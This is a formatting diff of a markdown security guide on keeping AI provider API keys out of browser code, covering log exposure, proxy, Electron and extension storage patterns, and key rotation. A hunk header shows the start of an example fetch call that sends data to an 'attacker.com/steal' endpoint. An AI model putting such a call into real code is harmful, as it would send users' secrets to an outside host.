@@ -64,11 +64,12 @@ fetch('https://attacker.com/steal', {
 
 **Scenario**: Google provider embeds key in URL query parameter (line 64 in providers.js).
 
-```
+```text
 https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5:generateContent?key=AIzaSy...
 ```
 
 **Log locations**:
+
 - Browser history
 - Server access logs
 - CDN/WAF logs
@@ -85,11 +86,13 @@ https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5:generateConte
 ### Pattern 1: Backend API Proxy (Recommended for Web Apps)
 
 **Architecture**:
+
 - Client: Sends request to your backend
 - Backend: Validates user, holds API key in environment variable, calls provider
 - Response: Proxied back to client
 
 **Benefits**:
+
 - API keys never exposed to browser
 - Rate limiting per user
 - Billing tied to your account
@@ -124,11 +127,13 @@ app.post('/api/ai/complete', async (req, res) => {
 ### Pattern 2: Electron App (Recommended for Desktop)
 
 **Architecture**:
+
 - Store API keys in Electron secure storage
 - Main process handles all API calls
 - Renderer process sends requests via IPC
 
 **Benefits**:
+
 - Keys stored encrypted on disk (OS keychain)
 - JavaScript isolation (main vs renderer)
 - No browser DevTools access to storage
@@ -156,11 +161,13 @@ const response = await window.ipcRenderer.invoke('ai:complete', 'Hello')
 ### Pattern 3: Browser Extension (Recommended for Automation)
 
 **Architecture**:
+
 - Store API keys in `chrome.storage.sync` (encrypted at rest)
 - Service worker handles requests
 - Content scripts send messages to service worker
 
 **Benefits**:
+
 - Chrome encrypts storage automatically
 - Scoped permissions (only your extension can access)
 - Survives browser restarts
@@ -214,6 +221,7 @@ const response = await createCompletion('Hello', config)
 ```
 
 **Safety**:
+
 - Test keys have strict rate limits (10 requests/min)
 - No production data exposed
 - Easy to revoke and replace
@@ -261,10 +269,12 @@ If you suspect an API key has been exposed:
    - Create new key for legitimate use
 
 4. **All Providers**: Check if key was committed to git
+
    ```bash
    git log -S "sk-ant-" # Search git history for key
    git log -S "AIzaSy" # Google keys
    ```
+
    If found in history, you must rotate (history is permanent).
 
 ---
